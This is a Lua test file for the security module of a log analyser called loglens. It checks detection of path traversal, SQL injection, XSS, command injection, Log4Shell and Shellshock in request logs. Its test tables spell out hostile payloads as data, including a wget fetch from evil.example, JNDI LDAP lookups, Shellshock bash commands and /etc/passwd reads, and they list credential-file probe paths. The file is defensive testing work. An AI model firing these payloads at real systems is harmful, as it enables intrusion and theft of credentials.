local t = require("spec.support")
local entry = require("loglens.parser.entry")
local security = require("loglens.security")
local lcg = require("tools.lcg")

-- 5-minute and hour aligned so burst windows are predictable.
local BASE = 1794312000

local function req(ip, ts, method, target, status, ua, referer)
  local record = entry.build(ip, ts, method, target, "HTTP/1.1", status or 200, 100, referer, ua)
  assert(record, "test record must be valid: " .. tostring(target))
  return record
end

-- Flattens scan() output into sorted "finding-id:label" strings.
local function signatures(target)
  local found = security.scan(target)
  local list = {}
  for id, labels in pairs(found or {}) do
    for _, label in ipairs(labels) do
      list[#list + 1] = id .. ":" .. label
    end
  end
  table.sort(list)
  return list
end

local function has(list, wanted)
  for _, item in ipairs(list) do
    if item == wanted then
      return true
    end
  end
  return false
end

local function finding_by_id(findings, id)
  for _, finding in ipairs(findings) do
    if finding.id == id then
      return finding
    end
  end
  return nil
end

---------------------------------------------------------------------------------------------

t.describe("security.scan: attack signatures", function()
  local POSITIVES = {
    -- path traversal and file inclusion
    { "/../../etc/passwd", "path-traversal:dot-dot-slash", "path-traversal:system-file" },
    { "/download?file=../../../etc/passwd", "path-traversal:dot-dot-slash" },
    { "/%2e%2e/%2e%2e/etc/passwd", "path-traversal:dot-dot-slash", "path-traversal:system-file" },
    { "/..%2f..%2fetc%2fpasswd", "path-traversal:dot-dot-slash" },
    { "/cgi-bin/.%2e/.%2e/bin/sh", "path-traversal:dot-dot-slash" },
    { "/%252e%252e/%252e%252e/etc/passwd", "path-traversal:dot-dot-slash" },
    { "/a/..\\..\\windows\\win.ini", "path-traversal:dot-dot-slash", "path-traversal:system-file" },
    { "/?page=php://filter/convert.base64-encode/resource=index.php", "path-traversal:stream-wrapper" },
    { "/?file=data://text/plain;base64,AAAA", "path-traversal:stream-wrapper" },
    { "/x%00.jpg", "path-traversal:null-byte" },
    { "/..;/manager/html", "path-traversal:dot-dot-slash" },
    { "/?f=c:\\windows\\win.ini", "path-traversal:system-file" },
    -- SQL injection
    { "/item?id=1' UNION SELECT username,password FROM users--", "sql-injection:union-select" },
    { "/item?id=1%20UNION%20ALL%20SELECT%20NULL,NULL", "sql-injection:union-select" },
    { "/item?id=1/**/UNION/**/SELECT/**/1", "sql-injection:union-select" },
    { "/login?u=admin' or '1'='1", "sql-injection:tautology" },
    { "/p?id=1 or 1=1", "sql-injection:tautology" },
    { "/p?id=1+AND+SLEEP(5)", "sql-injection:time-based" },
    { "/p?id=1;WAITFOR DELAY '0:0:5'", "sql-injection:time-based" },
    { "/p?q=information_schema.tables", "sql-injection:schema-enum" },
    { "/p?id=1' --", "sql-injection:quote-comment" },
    { "/?id=1;DROP TABLE users", "sql-injection:stacked-query" },
    -- cross-site scripting
    { "/search?q=<script>alert(1)</script>", "xss:script-tag" },
    { "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "xss:script-tag" },
    { "/?x=<img src=x onerror=alert(1)>", "xss:html-tag", "xss:event-handler" },
    { "/?x=javascript:alert(1)", "xss:script-uri" },
    { '/?x="><svg/onload=alert(1)>', "xss:html-tag", "xss:event-handler" },
    { "/?q=%3CIMG+SRC%3Dx+onerror%3Dalert(1)%3E", "xss:html-tag", "xss:event-handler" },
    -- command and code injection
    { "/?cmd=;cat /etc/passwd", "command-injection:chained-command" },
    { "/?x=$(whoami)", "command-injection:command-substitution" },
    { "/?x=`id`", "command-injection:command-substitution" },
    { "/?ip=127.0.0.1;ls -la", "command-injection:chained-command" },
    { "/?ip=127.0.0.1|whoami", "command-injection:chained-command" },
    { "/?x=wget http://evil.example/x.sh", "command-injection:download-exec" },
    { "/?q=%3C%3Fphp+system(%24_GET%5B1%5D)%3B%3F%3E", "command-injection:php-code" },
    { "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
      "command-injection:spring-classloader" },
    { "/?c=/bin/bash -i", "command-injection:shell-path" },
    -- Log4Shell
    { "/?x=${jndi:ldap://evil.example/a}", "log4shell:ldap" },
    { "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", "log4shell:ldap" },
    { "/?x=${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}", "log4shell:ldap" },
    { "/?x=${${lower:j}ndi:rmi://x/a}", "log4shell:rmi" },
  }

  t.it("detects the documented attack payloads (including encodings and evasions)", function()
    local misses = {}
    for _, case in ipairs(POSITIVES) do
      local found = signatures(case[1])
      for i = 2, #case do
        if not has(found, case[i]) then
          misses[#misses + 1] = case[1] .. "  should be tagged  " .. case[i] .. "  got " .. t.inspect(found)
        end
      end
    end
    t.eq(misses, {})
  end)

  local BENIGN = {
    "/",
    "/index.html",
    "/css/app.css?v=123",
    "/search?q=hello+world",
    "/search?q=caf%C3%A9",
    "/products?sort=price&order=asc&page=2",
    "/blog/union-select-the-best-dev-tools",
    "/files/archive..zip",
    "/docs/etc/passwd-policy",
    "/api/items?range=1..10",
    "/search?pets=dog|cat",
    "/page?id=42&name=bob",
    "/q?a=1;b=2",
    "/x?next=https://example.com/home",
    "/x?data=%7B%22a%22%3A1%7D",
    "/?tpl=${name}",
    "/blog/how-to-use-onerror-handlers",
    "/js/script.js",
    "/scripts/app.js?x=1",
    "/search?q=select+a+color",
    "/search?q=union+of+sets",
    "/?online=1",
    "/?q=1..10",
    "/?sleep=5",
    "/profile/o'brien",
    "/?q=it's+me",
    "/wp-content/uploads/2024/05/image..jpg",
    "/img/a%20b.png",
    "/search?q=C%2B%2B",
    "/?cat=5",
    "/?a=1&id=2&ping=3",
    "/?x=etc/passwd-guide",
    "/search?langs=php|python|ruby",
    "/?q=%E6%97%A5%E6%9C%AC%E8%AA%9E",
    "/a/b/c.html#section-2",
  }

  t.it("leaves ordinary and look-alike URLs alone", function()
    local false_positives = {}
    for _, target in ipairs(BENIGN) do
      local found = signatures(target)
      if #found > 0 then
        false_positives[#false_positives + 1] = target .. "  ->  " .. table.concat(found, ", ")
      end
    end
    t.eq(false_positives, {})
  end)

  t.it("scans headers for Log4Shell and Shellshock only", function()
    t.eq(security.scan_header("${jndi:ldap://x/a}"), { log4shell = { "ldap" } })
    t.eq(security.scan_header("${${::-j}ndi:dns://x/a}"), { log4shell = { "dns" } })
    t.eq(security.scan_header("() { :;}; /bin/bash -c 'cat /etc/passwd'"),
      { ["command-injection"] = { "shellshock" } })
    t.is_nil(security.scan_header("Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"))
    t.is_nil(security.scan_header("${env:HOME}"))
    t.is_nil(security.scan_header("${name}"))
    t.is_nil(security.scan_header("<script>alert(1)</script>"))
  end)

  t.it("is fast on long hostile targets", function()
    local started = os.clock()
    security.scan("/?q=" .. string.rep("%2e%2e/", 300))
    security.scan("/?q=" .. string.rep("union ", 300))
    security.scan("/?q=" .. string.rep("${", 500))
    security.scan("/?q=" .. string.rep("a=b;", 500))
    security.scan("/" .. string.rep("(", 2000))
    t.lt(os.clock() - started, 1)
  end)
end)

t.describe("security.probe_rule", function()
  t.it("recognises probe paths and their sensitivity", function()
    local cases = {
      { "/.env", "env-file", true },
      { "/.env.local", "env-file", true },
      { "/app/.env", "env-file", true },
      { "/.git/config", "git-repo", true },
      { "/.aws/credentials", "aws-credentials", true },
      { "/id_rsa", "ssh-keys", true },
      { "/backup.sql", "backup-file", true },
      { "/shell.php", "webshell", true },
      { "/wp-config.php", "wp-config", true },
      { "/actuator/env", "actuator-sensitive", true },
      { "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "phpunit-rce", true },
      { "/%2eenv", "env-file", true },
      { "/wp-login.php", "wp-login", false },
      { "/blog/wp-login.php", "wp-login", false },
      { "/xmlrpc.php", "xmlrpc", false },
      { "/wp-admin/admin-ajax.php", "wp-admin", false },
      { "/phpmyadmin/index.php", "db-admin", false },
      { "/phpMyAdmin-2.11.9.5/scripts/setup.php", "db-admin", false },
      { "/pma/", "db-admin", false },
      { "/cgi-bin/luci", "cgi-bin", false },
      { "/boaform/admin/formLogin", "iot-router", false },
      { "/actuator/health", "actuator", false },
      { "/server-status", "server-status", false },
      { "/manager/html", "tomcat-manager", false },
    }
    for _, case in ipairs(cases) do
      local rule, _, sensitive = security.probe_rule(case[1])
      t.eq({ rule, sensitive }, { case[2], case[3] }, case[1])
    end
  end)

  t.it("does not match look-alike paths", function()
    for _, path in ipairs({ "/", "/environment", "/envelope.php", "/.well-known/acme-challenge/abc",
      "/.well-known/security.txt", "/blog/phpmyadmin-tutorial", "/gitlab/projects", "/github.html",
      "/wp-content/uploads/a.jpg", "/administrator", "/admin/", "/login", "/api/v1/users",
      "/actuators", "/server-statuses", "/index.php", "/robots.txt", "/favicon.ico" }) do
      t.is_nil(security.probe_rule(path), path)
    end
  end)

  t.it("identifies login endpoints", function()
    for _, path in ipairs({ "/login", "/user/login/", "/wp-login.php", "/api/v1/auth/login",
      "/users/sign_in", "/xmlrpc.php", "/oauth/token", "/j_security_check", "/LOGIN" }) do
      t.is_true(security.is_login_path(path), path)
    end
    for _, path in ipairs({ "/blog/login-tips", "/loginpage", "/logout", "/", "/api/users",
      "/login/help" }) do
      t.is_false(security.is_login_path(path), path)
    end
  end)
end)

---------------------------------------------------------------------------------------------

t.describe("security findings: path probing", function()
  t.it("stays quiet for ordinary traffic, WordPress admins and health checks", function()
    local sec = security.new()
    local rng = lcg.new(3)
    for i = 1, 400 do
      sec:observe(req("203.0.113." .. rng:range(1, 40), BASE + i, "GET",
        rng:pick({ "/", "/about", "/blog/post-1", "/static/app.js", "/api/items?page=2", "/missing" }),
        rng:pick({ 200, 200, 200, 304, 404 }), "Mozilla/5.0 Chrome/120.0"))
    end
    for i = 1, 3 do
      sec:observe(req("198.51.100.20", BASE + i, "GET", "/wp-login.php", 200))
      sec:observe(req("198.51.100.20", BASE + i, "POST", "/wp-login.php", 302))
    end
    for i = 1, 6 do
      sec:observe(req("198.51.100.20", BASE + i, "GET", "/wp-admin/post.php?post=" .. i, 200))
    end
    for i = 1, 100 do
      sec:observe(req("10.0.0.9", BASE + i, "GET", "/actuator/health", 200, "kube-probe/1.28"))
      sec:observe(req("10.0.0.10", BASE + i, "GET", "/server-status?auto", 200))
    end
    t.eq(sec:findings({ ip_rates = {}, requests = 0 }), {})
  end)

  t.it("reports a single request for a sensitive file as low severity", function()
    local sec = security.new()
    sec:observe(req("198.51.100.7", BASE, "GET", "/.env", 404))
    local findings = sec:findings()
    t.eq(#findings, 1)
    t.eq({ findings[1].id, findings[1].severity, findings[1].count }, { "path-probing", "low", 1 })
    t.eq(findings[1].ips, { "198.51.100.7" })
  end)

  t.it("needs three different rules before reporting non-sensitive probes", function()
    local sec = security.new()
    sec:observe(req("198.51.100.8", BASE, "GET", "/wp-login.php", 404))
    sec:observe(req("198.51.100.8", BASE + 1, "GET", "/xmlrpc.php", 404))
    t.eq(sec:findings(), {})
    sec:observe(req("198.51.100.8", BASE + 2, "GET", "/phpmyadmin/", 404))
    local findings = sec:findings()
    t.eq(#findings, 1)
    t.eq(findings[1].severity, "low")
  end)

  t.it("escalates a wide sweep to medium and a 2xx on a sensitive file to high", function()
    local sec = security.new()
    for i, path in ipairs({ "/.git/config", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/",
      "/cgi-bin/luci", "/actuator/env", "/backup.sql" }) do
      sec:observe(req("198.51.100.9", BASE + i, "GET", path, 404, "Mozilla/5.0"))
    end
    local finding = sec:findings()[1]
    t.eq({ finding.id, finding.severity, finding.count }, { "path-probing", "medium", 7 })
    t.contains(finding.evidence[1], "7 probe requests from 1 address")
    t.contains(finding.evidence[2], "categories:")
    t.contains(table.concat(finding.evidence, "\n"), "198.51.100.9: 7 probes across 7 rules")
    t.contains(table.concat(finding.evidence, "\n"), "sample: GET /.git/config [404]")
    t.eq(#finding.limitations, 3)

    sec:observe(req("198.51.100.9", BASE + 20, "GET", "/.env", 200))
    local escalated = sec:findings()[1]
    t.eq(escalated.severity, "high")
    t.contains(table.concat(escalated.evidence, "\n"), "answered with a 2xx status, for example GET /.env [200]")
  end)

  t.it("reports proxy probes (CONNECT and absolute URIs)", function()
    local sec = security.new()
    sec:observe(req("198.51.100.12", BASE, "CONNECT", "example.com:443", 400))
    sec:observe(req("198.51.100.12", BASE + 1, "GET", "http://example.com/", 404))
    local finding = sec:findings()[1]
    t.eq({ finding.id, finding.severity, finding.count }, { "path-probing", "low", 2 })
    t.contains(finding.evidence[2], "open-proxy 2")
  end)
end)

t.describe("security findings: signatures", function()
  t.it("tags each attack family with counts, addresses, samples and a 2xx note", function()
    local sec = security.new()
    sec:observe(req("203.0.113.66", BASE, "GET", "/item?id=1' UNION SELECT user,pass FROM users--", 200))
    sec:observe(req("203.0.113.66", BASE + 1, "GET", "/item?id=1 or 1=1", 500))
    sec:observe(req("203.0.113.67", BASE + 2, "GET", "/../../etc/passwd", 404))
    sec:observe(req("203.0.113.68", BASE + 3, "GET", "/?q=<script>alert(1)</script>", 200))
    sec:observe(req("203.0.113.69", BASE + 4, "GET", "/?x=${jndi:ldap://evil.example/a}", 400))
    sec:observe(req("203.0.113.70", BASE + 5, "GET", "/?ip=1;whoami", 200))
    local findings = sec:findings()
    local ids = {}
    for i, finding in ipairs(findings) do
      ids[i] = finding.id
    end
    t.eq(ids, { "command-injection", "log4shell", "path-traversal", "sql-injection", "xss" })

    local sql = finding_by_id(findings, "sql-injection")
    t.eq({ sql.severity, sql.count }, { "medium", 2 })
    t.eq(sql.ips, { "203.0.113.66" })
    t.contains(sql.evidence[1], "2 matching requests from 1 address")
    t.contains(sql.evidence[2], "signatures: ")
    t.contains(table.concat(sql.evidence, "\n"), "1 of these request was answered with a 2xx status")
    t.eq(finding_by_id(findings, "path-traversal").severity, "medium")
    t.eq(finding_by_id(findings, "xss").severity, "low")
    t.eq(finding_by_id(findings, "log4shell").severity, "high")
    for _, finding in ipairs(findings) do
      t.ok(#finding.limitations >= 2, finding.id .. " needs limitations")
      t.ok(#finding.evidence >= 3, finding.id .. " needs evidence")
    end
  end)

  t.it("counts a request once per finding even when several signatures match", function()
    local sec = security.new()
    sec:observe(req("203.0.113.66", BASE, "GET", "/x?id=1' union select 1 or 1=1 '--", 200))
    local sql = finding_by_id(sec:findings(), "sql-injection")
    t.eq(sql.count, 1)
    t.eq(sql.ips, { "203.0.113.66" })
    t.contains(sql.evidence[1], "1 matching request from 1 address")
    t.eq(sql.evidence[2], "signatures: quote-comment 1, tautology 1, union-select 1")
    t.contains(sql.evidence[3], "203.0.113.66: 1 request")
  end)

  t.it("raises traversal to high when the server answered with 2xx", function()
    local sec = security.new()
    sec:observe(req("203.0.113.67", BASE, "GET", "/download?f=../../etc/passwd", 200))
    t.eq(sec:findings()[1].severity, "high")
  end)

  t.it("raises SQL injection to high under sustained attempts and XSS to medium", function()
    local sec = security.new()
    for i = 1, 25 do
      sec:observe(req("203.0.113.66", BASE + i, "GET", "/p?id=" .. i .. "' or 1=1--", 200))
    end
    for i = 1, 10 do
      sec:observe(req("203.0.113.68", BASE + i, "GET", "/s?q=<script>" .. i .. "</script>", 200))
    end
    local findings = sec:findings()
    t.eq(finding_by_id(findings, "sql-injection").severity, "high")
    t.eq(finding_by_id(findings, "xss").severity, "medium")
  end)

  t.it("flags scanner user agents but not search engines", function()
    local sec = security.new()
    for i = 1, 4 do
      sec:observe(req("203.0.113.80", BASE + i, "GET", "/page" .. i, 404, "sqlmap/1.7.11#stable (https://sqlmap.org)"))
    end
    sec:observe(req("203.0.113.81", BASE, "GET", "/", 200, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"))
    sec:observe(req("203.0.113.82", BASE, "GET", "/", 200, "curl/8.4.0"))
    local findings = sec:findings()
    t.eq(#findings, 1)
    t.eq({ findings[1].id, findings[1].severity, findings[1].count }, { "scanner-agents", "medium", 4 })
    t.contains(findings[1].evidence[2], "sqlmap 4")
    t.eq(findings[1].ips, { "203.0.113.80" })
  end)

  t.it("finds Log4Shell in the user agent and referer", function()
    local sec = security.new()
    sec:observe(req("203.0.113.90", BASE, "GET", "/", 200, "${jndi:ldap://evil.example/a}"))
    sec:observe(req("203.0.113.91", BASE, "GET", "/", 200, "Mozilla/5.0", "${${lower:j}ndi:rmi://x/a}"))
    sec:observe(req("203.0.113.92", BASE, "GET", "/", 200, "Mozilla/5.0 (X11)", "https://example.com/?a=(b)"))
    local findings = sec:findings()
    t.eq(#findings, 1)
    t.eq(findings[1].id, "log4shell")
    t.eq(findings[1].count, 2)
  end)

  t.it("finds Shellshock in the user agent", function()
    local sec = security.new()
    sec:observe(req("203.0.113.93", BASE, "GET", "/cgi-bin/status", 200, "() { :;}; /bin/bash -c 'id'"))
    local finding = finding_by_id(sec:findings(), "command-injection")
    t.ok(finding)
    t.contains(finding.evidence[2], "shellshock")
  end)

  t.it("ignores requests whose request line was unusable", function()
    local sec = security.new()
    local record = entry.build("203.0.113.5", BASE, nil, nil, nil, 400, 0, nil, "-")
    sec:observe(record)
    t.eq(sec:findings(), {})
  end)
end)

t.describe("security findings: authentication bursts", function()
  local function attempts(sec, ip, count, step, method, target, status)
    for i = 0, count - 1 do
      sec:observe(req(ip, BASE + i * step, method or "POST", target or "/login", status or 401))
    end
  end

  t.it("reports ten attempts inside one 5-minute window, not nine", function()
    local nine = security.new()
    attempts(nine, "198.51.100.30", 9, 10)
    t.eq(nine:findings(), {})
    local ten = security.new()
    attempts(ten, "198.51.100.30", 10, 10)
    local finding = ten:findings()[1]
    t.eq({ finding.id, finding.severity, finding.count }, { "brute-force", "medium", 10 })
    t.contains(finding.evidence[2], "198.51.100.30: 10 attempts within one 5-minute window (10 denied, 0 login POSTs")
  end)

  t.it("is high severity for sustained bursts", function()
    local sec = security.new()
    attempts(sec, "198.51.100.31", 60, 4)
    t.eq(sec:findings()[1].severity, "high")
    local many = security.new()
    for _, ip in ipairs({ "198.51.100.40", "198.51.100.41", "198.51.100.42", "198.51.100.43" }) do
      attempts(many, ip, 30, 5)
    end
    local finding = many:findings()[1]
    t.eq({ finding.severity, finding.count }, { "high", 120 })
    t.eq(#finding.ips, 4)
  end)

  t.it("counts login POSTs even when they return 200 or 302", function()
    local sec = security.new()
    attempts(sec, "198.51.100.32", 12, 5, "POST", "/wp-login.php", 200)
    local finding = sec:findings()[1]
    t.eq(finding.id, "brute-force")
    t.contains(finding.evidence[2], "0 denied, 12 login POSTs")
  end)

  t.it("counts 401s on any path and 403s on login paths", function()
    local sec = security.new()
    attempts(sec, "198.51.100.33", 11, 5, "GET", "/private/report", 401)
    t.eq(sec:findings()[1].id, "brute-force")
    local forbidden = security.new()
    attempts(forbidden, "198.51.100.34", 11, 5, "POST", "/admin/login", 403)
    t.eq(forbidden:findings()[1].id, "brute-force")
    local plain_403 = security.new()
    attempts(plain_403, "198.51.100.35", 30, 5, "GET", "/forbidden-area/", 403)
    t.eq(plain_403:findings(), {})
  end)

  t.it("ignores slow, spread-out and successful-looking activity", function()
    local slow = security.new()
    attempts(slow, "198.51.100.36", 40, 400, "POST", "/login", 401)
    t.eq(slow:findings(), {})
    local normal_use = security.new()
    attempts(normal_use, "198.51.100.37", 3, 20, "POST", "/login", 302)
    attempts(normal_use, "198.51.100.37", 2, 20, "POST", "/login", 401)
    t.eq(normal_use:findings(), {})
    local reads = security.new()
    attempts(reads, "198.51.100.38", 200, 1, "GET", "/login", 200)
    t.eq(reads:findings(), {})
  end)
end)

t.describe("security findings: request-rate outliers", function()
  local function clients(peaks)
    local list = {}
    for i, peak in ipairs(peaks) do
      list[i] = { key = string.format("192.0.2.%d", i), count = peak * 10, peak = peak }
    end
    return { ip_rates = list, requests = 5000 }
  end

  local function with_outlier()
    local peaks = {}
    for i = 1, 30 do
      peaks[i] = 2 + (i % 5)
    end
    peaks[31] = 400
    return clients(peaks)
  end

  t.it("flags a client far above the crowd", function()
    local findings = security.new():findings(with_outlier())
    t.eq(#findings, 1)
    t.eq({ findings[1].id, findings[1].severity }, { "rate-outlier", "low" })
    t.eq(findings[1].ips, { "192.0.2.31" })
    t.contains(findings[1].evidence[2], "192.0.2.31: up to 400 requests in one minute")
  end)

  t.it("does not flag uniformly busy traffic", function()
    local peaks = {}
    for i = 1, 50 do
      peaks[i] = 90 + (i % 7)
    end
    t.eq(security.new():findings(clients(peaks)), {})
  end)

  t.it("needs a population, a minimum rate and enough traffic", function()
    t.eq(security.new():findings(clients({ 400, 3, 3 })), {})
    local quiet = with_outlier()
    quiet.ip_rates[31].peak = 59
    t.eq(security.new():findings(quiet), {})
    local small = with_outlier()
    small.requests = 50
    t.eq(security.new():findings(small), {})
    t.eq(security.new():findings(), {})
  end)

  t.it("uses a tenfold rule when the crowd has no spread", function()
    local peaks = {}
    for i = 1, 20 do
      peaks[i] = 5
    end
    peaks[21] = 120
    t.eq(security.new():findings(clients(peaks))[1].id, "rate-outlier")
    peaks[21] = 40
    t.eq(security.new():findings(clients(peaks)), {})
  end)
end)

t.describe("security findings: output safety and bounds", function()
  local function all_text(findings)
    local parts = {}
    for _, finding in ipairs(findings) do
      parts[#parts + 1] = finding.title
      for _, line in ipairs(finding.evidence) do
        parts[#parts + 1] = line
      end
    end
    return table.concat(parts, "\n")
  end

  t.it("never echoes raw attack payloads or control characters", function()
    local sec = security.new()
    local payloads = {
      "/search?q=<script>alert('x')</script>",
      "/x?q=\27[31m\27]0;owned\7<img src=x onerror=alert(1)>",
      "/?x=${jndi:ldap://evil.example/a}",
      "/?c=`id`;$(whoami) \"quoted\" back\\slash",
      "/item?id=1' UNION SELECT user,pass FROM users--",
      "/\xe2\x80\xaeevil\xff\xfe.php?cmd=;cat /etc/passwd",
    }
    for i, target in ipairs(payloads) do
      sec:observe(req("203.0.113." .. i, BASE + i, "GET", target, 200, "sqlmap/1.7"))
    end
    sec:observe(req("203.0.113.99", BASE, "GET", "/.env", 200))
    local text = all_text(sec:findings())
    for _, raw in ipairs({ "<", ">", '"', "'", "`", "$", "{", "}", "\27", "\7", "\xff", "\xe2\x80\xae" }) do
      t.not_contains(text, raw, "evidence must not contain the raw character " .. t.inspect(raw))
    end
    -- Backslashes may only appear as part of loglens' own \xNN / \uXXXX / \UXXXXXXXX escapes.
    local without_escapes = text:gsub("\\x%x%x", ""):gsub("\\u%x%x%x%x", ""):gsub("\\U%x%x%x%x%x%x%x%x", "")
    t.not_contains(without_escapes, "\\", "a raw backslash must have been percent-encoded")
    t.ok(utf8.len(text), "evidence must be valid UTF-8")
    t.contains(text, "%3Cscript%3E")
    t.contains(text, "\\x1B")
  end)

  t.it("keeps memory bounded when thousands of addresses probe", function()
    local sec = security.new({ capacity = 200 })
    local started = os.clock()
    for i = 1, 20000 do
      sec:observe(req("10." .. (i // 65536) .. "." .. (i // 256 % 256) .. "." .. (i % 256), BASE + i, "GET", "/.env", 404))
    end
    t.lt(os.clock() - started, 4)
    t.eq(sec.probes:len(), 200)
    local finding = sec:findings()[1]
    t.eq(finding.id, "path-probing")
    t.ok(#finding.ips <= 10)
    t.ok(#finding.evidence <= 12)
  end)

  t.it("is deterministic", function()
    local function run()
      local sec = security.new()
      local rng = lcg.new(17)
      local targets = { "/.env", "/wp-login.php", "/?q=<script>", "/x?id=1 or 1=1", "/", "/a?b=${jndi:ldap://x/y}" }
      for i = 1, 600 do
        sec:observe(req("198.51.100." .. rng:range(1, 30), BASE + i, rng:pick({ "GET", "POST" }),
          rng:pick(targets), rng:pick({ 200, 401, 404 })))
      end
      return sec:findings({ ip_rates = {}, requests = 600 })
    end
    t.eq(run(), run())
  end)
end)
